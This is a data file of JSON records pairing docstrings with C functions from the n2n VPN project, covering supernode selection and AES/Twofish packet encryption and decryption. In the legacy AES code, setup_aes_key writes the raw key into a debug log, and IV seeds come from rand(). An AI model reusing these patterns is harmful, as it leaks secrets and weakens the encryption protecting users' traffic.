{"docstring": "/* Function that gathers requested data on a supernode. */\n", "func_signal": "SN_SELECTION_CRITERION_DATA_TYPE sn_selection_criterion_gather_data (n2n_sn_t *sss)", "code": "{\n\n  SN_SELECTION_CRITERION_DATA_TYPE data = 0, tmp = 0;\n  struct sn_community *comm, *tmp_comm;\n\n  HASH_ITER(hh, sss->communities, comm, tmp_comm) {\n    tmp = HASH_COUNT(comm->edges) + 1; /* number of nodes in the community + the community itself. */\n    if(comm->header_encryption == HEADER_ENCRYPTION_ENABLED) { /*double-count encrypted communities (and their nodes): they exert more load on supernode. */\n      tmp *= 2;\n    }\n    data += tmp;\n  }\n\n  return htobe32(data);\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// the Twofish packet format consists of\n//\n//  - a random TF_PREAMBLE_SIZE-sized value prepended to plaintext\n//    encrypted together with the...\n//  - ... payload data\n//\n//  [VV|DDDDDDDDDDDDDDDDDDDDD]\n//  | <---- encrypted ---->  |\n//\n", "func_signal": "static int transop_encode_tf (n2n_trans_op_t *arg,\n                              uint8_t *outbuf,\n                              size_t out_len,\n                              const uint8_t *inbuf,\n                              size_t in_len,\n                              const uint8_t *peer_mac)", "code": "{\n\n    transop_tf_t *priv = (transop_tf_t *)arg->priv;\n\n    // the assembly buffer is a source for encrypting data\n    // the whole contents of assembly are encrypted\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n    size_t idx = 0;\n    int padded_len;\n    uint8_t padding;\n    uint8_t buf[TF_BLOCK_SIZE];\n\n    if(in_len <= N2N_PKT_BUF_SIZE) {\n        if((in_len + TF_PREAMBLE_SIZE + TF_BLOCK_SIZE) <= out_len) {\n            traceEvent(TRACE_DEBUG, \"transop_encode_tf %lu bytes plaintext\", in_len);\n\n            // full block sized random value (128 bit)\n            encode_uint64(assembly, &idx, n2n_rand());\n            encode_uint64(assembly, &idx, n2n_rand());\n\n            // adjust for maybe differently chosen TF_PREAMBLE_SIZE\n            idx = TF_PREAMBLE_SIZE;\n\n            // the plaintext data\n            encode_buf(assembly, &idx, inbuf, in_len);\n\n            // round up to next whole TF block size\n            padded_len = (((idx - 1) / TF_BLOCK_SIZE) + 1) * TF_BLOCK_SIZE;\n            padding = (padded_len-idx);\n\n            // pad the following bytes with zero, fixed length (TF_BLOCK_SIZE) seems to compile\n            // to slightly faster code than run-time dependant 'padding'\n            memset(assembly + idx, 0, TF_BLOCK_SIZE);\n            tf_cbc_encrypt(outbuf, assembly, padded_len, tf_null_iv, priv->ctx);\n\n            if(padding) {\n                // exchange last two cipher blocks\n                memcpy(buf, outbuf + padded_len - TF_BLOCK_SIZE, TF_BLOCK_SIZE);\n                memcpy(outbuf + padded_len - TF_BLOCK_SIZE, outbuf + padded_len - 2 * TF_BLOCK_SIZE, TF_BLOCK_SIZE);\n                memcpy(outbuf + padded_len - 2 * TF_BLOCK_SIZE, buf, TF_BLOCK_SIZE);\n            }\n        } else\n          traceEvent(TRACE_ERROR, \"transop_encode_tf outbuf too small\");\n    } else\n        traceEvent(TRACE_ERROR, \"transop_encode_tf inbuf too big to encrypt\");\n\n    return idx;\n}", "path": "n2n/src/transform_tf.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// see transop_encode_aes for packet format\n", "func_signal": "static int transop_decode_aes (n2n_trans_op_t *arg,\n                               uint8_t *outbuf,\n                               size_t out_len,\n                               const uint8_t *inbuf,\n                               size_t in_len,\n                               const uint8_t *peer_mac)", "code": "{\n\n    transop_aes_t *priv = (transop_aes_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n\n    uint8_t rest;\n    size_t penultimate_block;\n    uint8_t buf[AES_BLOCK_SIZE];\n    int len = -1;\n\n     if(((in_len - AES_PREAMBLE_SIZE) <= N2N_PKT_BUF_SIZE) /* cipher text fits in assembly */\n      && (in_len >= AES_PREAMBLE_SIZE)                     /* has at least random number */\n      && (in_len >= AES_BLOCK_SIZE)) {                     /* minimum size requirement for cipher text stealing */\n        traceEvent(TRACE_DEBUG, \"transop_decode_aes %lu bytes ciphertext\", in_len);\n\n        rest = in_len % AES_BLOCK_SIZE;\n        if(rest) { /* cipher text stealing */\n            penultimate_block = ((in_len / AES_BLOCK_SIZE) - 1) * AES_BLOCK_SIZE;\n\n            // everything normal up to penultimate block\n            memcpy(assembly, inbuf, penultimate_block);\n\n            // prepare new penultimate block in buf\n            aes_ecb_decrypt(buf, inbuf + penultimate_block, priv->ctx);\n            memcpy(buf, inbuf + in_len - rest, rest);\n\n            // former penultimate block becomes new ultimate block\n            memcpy(assembly + penultimate_block + AES_BLOCK_SIZE, inbuf + penultimate_block, AES_BLOCK_SIZE);\n\n            // write new penultimate block from buf\n            memcpy(assembly + penultimate_block, buf, AES_BLOCK_SIZE);\n\n            // regular cbc decryption of the re-arranged ciphertext\n            aes_cbc_decrypt(assembly, assembly, in_len + AES_BLOCK_SIZE - rest, aes_null_iv, priv->ctx);\n\n            // check for expected zero padding and give a warning otherwise\n            if(memcmp(assembly + in_len, aes_null_iv, AES_BLOCK_SIZE - rest)) {\n                traceEvent(TRACE_WARNING, \"transop_decode_aes payload decryption failed with unexpected cipher text stealing padding\");\n                return -1;\n            }\n        } else {\n            // regular cbc decryption on multiple block-sized payload\n            aes_cbc_decrypt(assembly, inbuf, in_len, aes_null_iv, priv->ctx);\n        }\n        len = in_len - AES_PREAMBLE_SIZE;\n        memcpy(outbuf, assembly + AES_PREAMBLE_SIZE, len);\n    } else\n        traceEvent(TRACE_ERROR, \"transop_decode_aes inbuf wrong size (%ul) to decrypt\", in_len);\n\n    return len;\n}", "path": "n2n/src/transform_aes.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// AES initialization function\n", "func_signal": "int n2n_transop_aes_init (const n2n_edge_conf_t *conf, n2n_trans_op_t *ttt)", "code": "{\n\n    transop_aes_t *priv;\n    const u_char *encrypt_key = (const u_char *)conf->encrypt_key;\n    size_t encrypt_key_len = strlen(conf->encrypt_key);\n\n    memset(ttt, 0, sizeof(*ttt));\n    ttt->transform_id = N2N_TRANSFORM_ID_AES;\n\n    ttt->tick         = transop_tick_aes;\n    ttt->deinit       = transop_deinit_aes;\n    ttt->fwd          = transop_encode_aes;\n    ttt->rev          = transop_decode_aes;\n\n    priv = (transop_aes_t*)calloc(1, sizeof(transop_aes_t));\n    if(!priv) {\n        traceEvent(TRACE_ERROR, \"n2n_transop_aes_init cannot allocate transop_aes_t memory\");\n        return -1;\n    }\n    ttt->priv = priv;\n\n    // setup the cipher and key\n    return setup_aes_key(priv, encrypt_key, encrypt_key_len);\n}", "path": "n2n/src/transform_aes.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Search through the array of SAs to find the one with the required ID.\n *\n * @return array index where found or -1 if not found\n */\n", "func_signal": "static ssize_t aes_find_sa( const transop_aes_t * priv, const n2n_sa_t req_id )", "code": "{\n    size_t i;\n    \n    for (i=0; i < priv->num_sa; ++i)\n    {\n        const sa_aes_t * sa=NULL;\n\n        sa = &(priv->sa[i]);\n        if (req_id == sa->sa_id)\n        {\n            return i;\n        }\n    }\n\n    return -1;\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Set selection_criterion field to default value according to selected strategy. */\n", "func_signal": "int sn_selection_criterion_default (SN_SELECTION_CRITERION_DATA_TYPE *selection_criterion)", "code": "{\n\n  *selection_criterion = (SN_SELECTION_CRITERION_DATA_TYPE) UINT32_MAX >> 1;\n\n  return 0; /* OK */\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Initialize selection_criterion field in peer_info structure*/\n", "func_signal": "int sn_selection_criterion_init (peer_info_t *peer)", "code": "{\n\n  if(peer != NULL) {\n    sn_selection_criterion_default(&(peer->selection_criterion));\n  }\n\n  return 0; /* OK */\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// Twofish initialization function\n", "func_signal": "int n2n_transop_tf_init (const n2n_edge_conf_t *conf, n2n_trans_op_t *ttt)", "code": "{\n\n    transop_tf_t *priv;\n    const u_char *encrypt_key = (const u_char *)conf->encrypt_key;\n    size_t encrypt_key_len = strlen(conf->encrypt_key);\n\n    memset(ttt, 0, sizeof(*ttt));\n    ttt->transform_id = N2N_TRANSFORM_ID_TWOFISH;\n\n    ttt->tick         = transop_tick_tf;\n    ttt->deinit       = transop_deinit_tf;\n    ttt->fwd          = transop_encode_tf;\n    ttt->rev          = transop_decode_tf;\n\n    priv = (transop_tf_t*)calloc(1, sizeof(transop_tf_t));\n    if(!priv) {\n        traceEvent(TRACE_ERROR, \"n2n_transop_tf_cbc_init cannot allocate transop_tf_t memory\");\n        return -1;\n    }\n    ttt->priv = priv;\n\n    // setup the cipher and key\n    return setup_tf_key(priv, encrypt_key, encrypt_key_len);\n}", "path": "n2n/src/transform_tf.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Function that sorts peer_list using sn_selection_criterion_sort. */\n", "func_signal": "int sn_selection_sort (peer_info_t **peer_list)", "code": "{\n\n  HASH_SORT(*peer_list, sn_selection_criterion_sort);\n\n  return 0; /* OK */\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Set sn_selection_criterion_common_data field to default value. */\n", "func_signal": "int sn_selection_criterion_common_data_default (n2n_edge_t *eee)", "code": "{\n\n  SN_SELECTION_CRITERION_DATA_TYPE tmp = 0;\n\n  tmp = HASH_COUNT(eee->pending_peers);\n  if(eee->conf.header_encryption == HEADER_ENCRYPTION_ENABLED) {\n    tmp *= 2;\n  }\n  eee->sn_selection_criterion_common_data = tmp / HASH_COUNT(eee->conf.supernodes);\n\n  return 0; /* OK */\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Setup AES in pre-shared key mode */\n", "func_signal": "int transop_aes_setup_psk(n2n_trans_op_t *ttt,\n                           n2n_sa_t sa_num,\n                           uint8_t *encrypt_pwd,\n                           uint32_t encrypt_pwd_len)", "code": "{\n    int retval = 1;\n    transop_aes_t *priv = (transop_aes_t *)ttt->priv;\n\n    if(ttt->priv) {\n        /* Replace the tick function with the PSK version of it */\n        ttt->tick = transop_tick_aes_psk;\n        priv->psk_mode = 1;\n        priv->num_sa=0;\n        priv->tx_sa=0;\n\n        /* Setup the key to use for encryption/decryption */\n        add_aes_key(priv, encrypt_pwd, encrypt_pwd_len);\n\n        retval = 0;\n    } else\n        traceEvent(TRACE_ERROR, \"AES priv is not allocated\");\n\n    return retval;\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// see transop_encode_tf for packet format\n", "func_signal": "static int transop_decode_tf (n2n_trans_op_t *arg,\n                              uint8_t *outbuf,\n                              size_t out_len,\n                              const uint8_t *inbuf,\n                              size_t in_len,\n                              const uint8_t *peer_mac)", "code": "{\n\n\n    transop_tf_t *priv = (transop_tf_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n\n    uint8_t rest;\n    size_t penultimate_block;\n    uint8_t buf[TF_BLOCK_SIZE];\n    int len = -1;\n\n    if(((in_len - TF_PREAMBLE_SIZE) <= N2N_PKT_BUF_SIZE) /* cipher text fits in assembly */\n     && (in_len >= TF_PREAMBLE_SIZE)                     /* has at least random number */\n     && (in_len >= TF_BLOCK_SIZE)) {                     /* minimum size requirement for cipher text stealing */\n\n        traceEvent(TRACE_DEBUG, \"transop_decode_tf %lu bytes ciphertext\", in_len);\n\n        rest = in_len % TF_BLOCK_SIZE;\n        if(rest) { /* cipher text stealing */\n            penultimate_block = ((in_len / TF_BLOCK_SIZE) - 1) * TF_BLOCK_SIZE;\n\n            // everything normal up to penultimate block\n            memcpy(assembly, inbuf, penultimate_block);\n\n            // prepare new penultimate block in buf\n            tf_ecb_decrypt(buf, inbuf + penultimate_block, priv->ctx);\n            memcpy(buf, inbuf + in_len - rest, rest);\n\n            // former penultimate block becomes new ultimate block\n            memcpy(assembly + penultimate_block + TF_BLOCK_SIZE, inbuf + penultimate_block, TF_BLOCK_SIZE);\n\n            // write new penultimate block from buf\n            memcpy(assembly + penultimate_block, buf, TF_BLOCK_SIZE);\n\n            // regular cbc decryption of the re-arranged ciphertext\n            tf_cbc_decrypt(assembly, assembly, in_len + TF_BLOCK_SIZE - rest, tf_null_iv, priv->ctx);\n\n            // check for expected zero padding and give a warning otherwise\n            if(memcmp(assembly + in_len, tf_null_iv, TF_BLOCK_SIZE - rest)) {\n                traceEvent(TRACE_WARNING, \"transop_decode_tf payload decryption failed with unexpected cipher text stealing padding\");\n                return -1;\n            }\n        } else {\n            // regular cbc decryption on multiple block-sized payload\n            tf_cbc_decrypt(assembly, inbuf, in_len, tf_null_iv, priv->ctx);\n        }\n        len = in_len - TF_PREAMBLE_SIZE;\n        memcpy(outbuf, assembly + TF_PREAMBLE_SIZE, len);\n    } else\n        traceEvent(TRACE_ERROR, \"transop_decode_tf inbuf wrong size (%ul) to decrypt\", in_len);\n\n    return len;\n}", "path": "n2n/src/transform_tf.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Convert selection_criterion field in a string for management port output. */\n", "func_signal": "extern char * sn_selection_criterion_str (selection_criterion_str_t out, peer_info_t *peer)", "code": "{\n\n  if(NULL == out) {\n    return NULL;\n  }\n  memset(out, 0, SN_SELECTION_CRITERION_BUF_SIZE);\n  snprintf(out, SN_SELECTION_CRITERION_BUF_SIZE - 1,  \"ld = %d\", (short int)(peer->selection_criterion));\n\n  return out;\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/** The aes packet format consists of:\n *\n *  - a 8-bit aes encoding version in clear text\n *  - a 32-bit SA number in clear text\n *  - a 64-bit random IV seed\n *  - ciphertext encrypted from a 32-bit nonce followed by the payload.\n *\n *  [V|SSSS|II|nnnnDDDDDDDDDDDDDDDDDDDDD]\n *            |<------ encrypted ------>|\n */\n", "func_signal": "static int transop_encode_aes( n2n_trans_op_t * arg,\n                                   uint8_t * outbuf,\n                                   size_t out_len,\n                                   const uint8_t * inbuf,\n                                   size_t in_len,\n                                   const uint8_t * peer_mac)", "code": "{\n    int len2=-1;\n    transop_aes_t * priv = (transop_aes_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE] = {0};\n    uint32_t * pnonce;\n\n    if ( (in_len + TRANSOP_AES_NONCE_SIZE) <= N2N_PKT_BUF_SIZE )\n    {\n        if ( (in_len + TRANSOP_AES_NONCE_SIZE + TRANSOP_AES_PREAMBLE_SIZE) <= out_len )\n        {\n            int len=-1;\n            size_t idx=0;\n            sa_aes_t * sa;\n            size_t tx_sa_num = 0;\n            uint64_t iv_seed = 0;\n            uint8_t padding = 0;\n            n2n_aes_ivec_t enc_ivec = {0};\n\n            /* The transmit sa is periodically updated */\n            tx_sa_num = aes_choose_tx_sa( priv, peer_mac );\n\n            sa = &(priv->sa[tx_sa_num]); /* Proper Tx SA index */\n        \n            traceEvent( TRACE_DEBUG, \"encode_aes %lu with SA %lu.\", in_len, sa->sa_id );\n            \n            /* Encode the aes format version. */\n            encode_uint8( outbuf, &idx, N2N_AES_TRANSFORM_VERSION );\n\n            /* Encode the security association (SA) number */\n            encode_uint32( outbuf, &idx, sa->sa_id );\n\n            /* Generate and encode the IV seed.\n             * Using two calls to rand() because RAND_MAX is usually < 64bit\n             * (e.g. linux) and sometimes < 32bit (e.g. Windows).\n             */\n            ((uint32_t*)&iv_seed)[0] = rand();\n            ((uint32_t*)&iv_seed)[1] = rand();\n            encode_buf(outbuf, &idx, &iv_seed, sizeof(iv_seed));\n\n            /* Encrypt the assembly contents and write the ciphertext after the SA. */\n            len = in_len + TRANSOP_AES_NONCE_SIZE;\n\n            /* The assembly buffer is a source for encrypting data. The nonce is\n             * written in first followed by the packet payload. The whole\n             * contents of assembly are encrypted. */\n            pnonce = (uint32_t *)assembly;\n            *pnonce = rand();\n            memcpy( assembly + TRANSOP_AES_NONCE_SIZE, inbuf, in_len );\n\n            /* Need at least one encrypted byte at the end for the padding. */\n            len2 = ( (len / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE; /* Round up to next whole AES adding at least one byte. */\n            padding = (len2-len);\n            assembly[len2 - 1] = padding;\n            traceEvent( TRACE_DEBUG, \"padding = %u, seed = %016lx\", padding, iv_seed );\n\n            set_aes_cbc_iv(sa, enc_ivec, iv_seed);\n\n            AES_cbc_encrypt( assembly, /* source */\n                             outbuf + TRANSOP_AES_PREAMBLE_SIZE, /* dest */\n                             len2, /* enc size */\n                             &(sa->enc_key), enc_ivec, AES_ENCRYPT );\n\n            len2 += TRANSOP_AES_PREAMBLE_SIZE; /* size of data carried in UDP. */\n        }\n        else\n        {\n            traceEvent( TRACE_ERROR, \"encode_aes outbuf too small.\" );\n        }\n    }\n    else\n    {\n        traceEvent( TRACE_ERROR, \"encode_aes inbuf too big to encrypt.\" );\n    }\n\n    return len2;\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "// the aes packet format consists of\n//\n//  - a random AES_PREAMBLE_SIZE-sized value prepended to plaintext\n//    encrypted together with the...\n//  - ... payload data\n//\n//  [VV|DDDDDDDDDDDDDDDDDDDDD]\n//  | <---- encrypted ---->  |\n//\n", "func_signal": "static int transop_encode_aes (n2n_trans_op_t *arg,\n                               uint8_t *outbuf,\n                               size_t out_len,\n                               const uint8_t *inbuf,\n                               size_t in_len,\n                               const uint8_t *peer_mac)", "code": "{\n\n    transop_aes_t *priv = (transop_aes_t *)arg->priv;\n\n    // the assembly buffer is a source for encrypting data\n    // the whole contents of assembly are encrypted\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n    size_t idx = 0;\n    int padded_len;\n    uint8_t padding;\n    uint8_t buf[AES_BLOCK_SIZE];\n\n    if(in_len <= N2N_PKT_BUF_SIZE) {\n        if((in_len + AES_PREAMBLE_SIZE + AES_BLOCK_SIZE) <= out_len) {\n            traceEvent(TRACE_DEBUG, \"transop_encode_aes %lu bytes plaintext\", in_len);\n\n            // full block sized random value (128 bit)\n            encode_uint64(assembly, &idx, n2n_rand());\n            encode_uint64(assembly, &idx, n2n_rand());\n\n            // adjust for maybe differently chosen AES_PREAMBLE_SIZE\n            idx = AES_PREAMBLE_SIZE;\n\n            // the plaintext data\n            encode_buf(assembly, &idx, inbuf, in_len);\n\n            // round up to next whole AES block size\n            padded_len = (((idx - 1) / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;\n            padding = (padded_len-idx);\n\n            // pad the following bytes with zero, fixed length (AES_BLOCK_SIZE) seems to compile\n            // to slightly faster code than run-time dependant 'padding'\n            memset(assembly + idx, 0, AES_BLOCK_SIZE);\n\n            aes_cbc_encrypt(outbuf, assembly, padded_len, aes_null_iv, priv->ctx);\n\n            if(padding) {\n                // exchange last two cipher blocks\n                memcpy(buf, outbuf+padded_len - AES_BLOCK_SIZE, AES_BLOCK_SIZE);\n                memcpy(outbuf + padded_len - AES_BLOCK_SIZE, outbuf + padded_len - 2 * AES_BLOCK_SIZE, AES_BLOCK_SIZE);\n                memcpy(outbuf + padded_len - 2 * AES_BLOCK_SIZE, buf, AES_BLOCK_SIZE);\n            }\n        } else\n            traceEvent(TRACE_ERROR, \"transop_encode_aes outbuf too small\");\n    } else\n    traceEvent(TRACE_ERROR, \"transop_encode_aes inbuf too big to encrypt\");\n\n    return idx;\n}", "path": "n2n/src/transform_aes.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* NOTE: the caller should adjust priv->num_sa accordingly */\n", "func_signal": "static int setup_aes_key(transop_aes_t *priv, const uint8_t *key, ssize_t key_size, size_t sa_num)", "code": "{\n    sa_aes_t * sa = &(priv->sa[sa_num]);\n    size_t aes_keysize_bytes;\n    size_t aes_keysize_bits;\n    struct sha512_keybuf keybuf;\n\n    /* Clear out any old possibly longer key matter. */\n    memset( &(sa->enc_key), 0, sizeof(sa->enc_key) );\n    memset( &(sa->dec_key), 0, sizeof(sa->dec_key) );\n    memset( &(sa->iv_enc_key), 0, sizeof(sa->iv_enc_key) );\n    memset( &(sa->iv_ext_val), 0, sizeof(sa->iv_ext_val) );\n\n    /* We still use aes_best_keysize (even not necessary since we hash the key\n     * into the 256bits enc_dec_key) to let the users choose the degree of encryption.\n     * Long keys will pick AES192 or AES256 with more robust but expensive encryption.\n     */\n    aes_keysize_bytes = aes_best_keysize(key_size);\n    aes_keysize_bits = 8 * aes_keysize_bytes;\n\n    /* Hash the main key to generate subkeys */\n    SHA512(key, key_size, (u_char*)&keybuf);\n\n    /* setup of enc_key/dec_key, used for the CBC encryption */\n    AES_set_encrypt_key(keybuf.enc_dec_key, aes_keysize_bits, &(sa->enc_key));\n    AES_set_decrypt_key(keybuf.enc_dec_key, aes_keysize_bits, &(sa->dec_key));\n\n    /* setup of iv_enc_key and iv_ext_val, used for generating the CBC IV */\n    AES_set_encrypt_key(keybuf.iv_enc_key, sizeof(keybuf.iv_enc_key) * 8, &(sa->iv_enc_key));\n    memcpy(sa->iv_ext_val, keybuf.iv_ext_val, sizeof(keybuf.iv_ext_val));\n\n    traceEvent( TRACE_DEBUG, \"transop_addspec_aes sa_id=%u, %u bits key=%s.\\n\",\n                priv->sa[sa_num].sa_id, aes_keysize_bits, key);\n\n    return(0);\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/*\n * priv: pointer to transform state\n * keybuf: buffer holding the key\n * pstat: length of keybuf\n */\n", "func_signal": "static void add_aes_key(transop_aes_t *priv, uint8_t *keybuf, ssize_t pstat)", "code": "{\n    setup_aes_key(priv, keybuf, pstat, priv->num_sa);\n    ++(priv->num_sa);\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* See transop_encode_aes for packet format */\n", "func_signal": "static int transop_decode_aes( n2n_trans_op_t * arg,\n                                   uint8_t * outbuf,\n                                   size_t out_len,\n                                   const uint8_t * inbuf,\n                                   size_t in_len,\n                                   const uint8_t * peer_mac)", "code": "{\n    int len=0;\n    transop_aes_t * priv = (transop_aes_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n\n    if ( ( (in_len - TRANSOP_AES_PREAMBLE_SIZE) <= N2N_PKT_BUF_SIZE ) /* Cipher text fits in assembly */\n         && (in_len >= (TRANSOP_AES_PREAMBLE_SIZE + TRANSOP_AES_NONCE_SIZE) ) /* Has at least version, SA, iv seed and nonce */\n        )\n    {\n        n2n_sa_t sa_rx;\n        ssize_t sa_idx=-1;\n        size_t rem=in_len;\n        size_t idx=0;\n        uint8_t aes_enc_ver=0;\n        uint64_t iv_seed=0;\n\n        /* Get the encoding version to make sure it is supported */\n        decode_uint8( &aes_enc_ver, inbuf, &rem, &idx );\n\n        if ( N2N_AES_TRANSFORM_VERSION == aes_enc_ver )\n        {\n            /* Get the SA number and make sure we are decrypting with the right one. */\n            decode_uint32( &sa_rx, inbuf, &rem, &idx );\n\n            sa_idx = aes_choose_rx_sa(priv, peer_mac, sa_rx);\n\n            if ( sa_idx >= 0 )\n            {\n                sa_aes_t * sa = &(priv->sa[sa_idx]);\n\n                /* Get the IV seed */\n                decode_buf((uint8_t *)&iv_seed, sizeof(iv_seed), inbuf, &rem, &idx);\n\n                traceEvent( TRACE_DEBUG, \"decode_aes %lu with SA %lu and seed %016lx\", in_len, sa->sa_id, iv_seed );\n\n                len = (in_len - TRANSOP_AES_PREAMBLE_SIZE);\n                \n                if ( 0 == (len % AES_BLOCK_SIZE ) )\n                {\n                    uint8_t padding;\n                    n2n_aes_ivec_t dec_ivec = {0};\n\n                    set_aes_cbc_iv(sa, dec_ivec, iv_seed);\n\n                    AES_cbc_encrypt( (inbuf + TRANSOP_AES_PREAMBLE_SIZE),\n                                     assembly, /* destination */\n                                     len, \n                                     &(sa->dec_key),\n                                     dec_ivec, AES_DECRYPT );\n\n                    /* last byte is how much was padding: max value should be\n                     * AES_BLOCKSIZE-1 */\n                    padding = assembly[ len-1 ] & 0xff; \n\n                    if ( len >= (padding + TRANSOP_AES_NONCE_SIZE))\n                    {\n                        /* strictly speaking for this to be an ethernet packet\n                         * it is going to need to be even bigger; but this is\n                         * enough to prevent segfaults. */\n                        traceEvent( TRACE_DEBUG, \"padding = %u\", padding );\n                        len -= padding;\n\n                        len -= TRANSOP_AES_NONCE_SIZE; /* size of ethernet packet */\n\n                        /* Step over 4-byte random nonce value */\n                        memcpy( outbuf, \n                                assembly + TRANSOP_AES_NONCE_SIZE, \n                                len );\n                    }\n                    else\n                    {\n                        traceEvent( TRACE_WARNING, \"UDP payload decryption failed.\" );\n                    }\n                }\n                else\n                {\n                    traceEvent( TRACE_WARNING, \"Encrypted length %d is not a multiple of AES_BLOCK_SIZE (%d)\", len, AES_BLOCK_SIZE );\n                    len = 0;\n                }\n\n            }\n            else\n            {\n                /* Wrong security association; drop the packet as it is undecodable. */\n                traceEvent( TRACE_ERROR, \"decode_aes SA number %lu not found.\", sa_rx );\n\n                /* REVISIT: should be able to load a new SA at this point to complete the decoding. */\n            }\n        }\n        else\n        {\n            /* Wrong security association; drop the packet as it is undecodable. */\n            traceEvent( TRACE_ERROR, \"decode_aes unsupported aes version %u.\", aes_enc_ver );\n\n            /* REVISIT: should be able to load a new SA at this point to complete the decoding. */\n        }        \n    }\n    else\n    {\n        traceEvent( TRACE_ERROR, \"decode_aes inbuf wrong size (%ul) to decrypt.\", in_len );\n    }\n\n    return len;\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Return the best acceptable AES key size (in bytes) given an input keysize. \n *\n * The value returned will be one of AES128_KEY_BYTES, AES192_KEY_BYTES or\n * AES256_KEY_BYTES.\n */\n", "func_signal": "static size_t aes_best_keysize(size_t numBytes)", "code": "{\n    if (numBytes >= AES256_KEY_BYTES )\n    {\n        return AES256_KEY_BYTES;\n    }\n    else if (numBytes >= AES192_KEY_BYTES)\n    {\n        return AES192_KEY_BYTES;\n    }\n    else\n    {\n        return AES128_KEY_BYTES;\n    }\n}", "path": "n2n/legacy/transform_aes.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
{"docstring": "/* Take data from PEER_INFO payload and transform them into a selection_criterion.\n * This function is highly dependant of the chosen selection criterion.\n */\n", "func_signal": "int sn_selection_criterion_calculate (n2n_edge_t *eee, peer_info_t *peer, SN_SELECTION_CRITERION_DATA_TYPE *data)", "code": "{\n\n  SN_SELECTION_CRITERION_DATA_TYPE common_data;\n  int sum = 0;\n\n  common_data = sn_selection_criterion_common_read(eee);\n  peer->selection_criterion = (SN_SELECTION_CRITERION_DATA_TYPE)(be32toh(*data) + common_data);\n\n  /* Mitigation of the real supernode load in order to see less oscillations.\n   * Edges jump from a supernode to another back and forth due to purging.\n   * Because this behavior has a cost of switching, the real load is mitigated with a stickyness factor.\n   * This factor is dynamically calculated basing on network size and prevent that unnecessary switching */\n  if(peer == eee->curr_sn) {\n    sum = HASH_COUNT(eee->known_peers) + HASH_COUNT(eee->pending_peers);\n    peer->selection_criterion = peer->selection_criterion * sum / (sum + 1);\n  }\n\n  return 0; /* OK */\n}", "path": "n2n/src/sn_selection.c", "commit_date": "2020-12-19 00:00:00", "repo_name": "ntop/n2n", "stars": 5784, "license": "gpl-3.0", "language": "c", "size": 3696}
